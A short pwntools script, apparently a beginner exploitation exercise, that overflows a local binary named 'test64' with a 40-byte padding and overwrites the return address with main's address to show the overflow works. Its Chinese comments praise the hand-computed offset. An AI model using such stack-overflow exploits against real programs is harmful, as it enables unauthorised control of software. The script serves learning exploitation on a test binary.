from pwn import *

elf = ELF('./test64')
p = process('./test64')

# 你亲手算的精准偏移（完全正确）
offset = 40

# 直接跳转到 main 函数，证明溢出成功
payload = b'A' * offset + p64(elf.sym.main)

p.sendline(payload)
p.interactive()
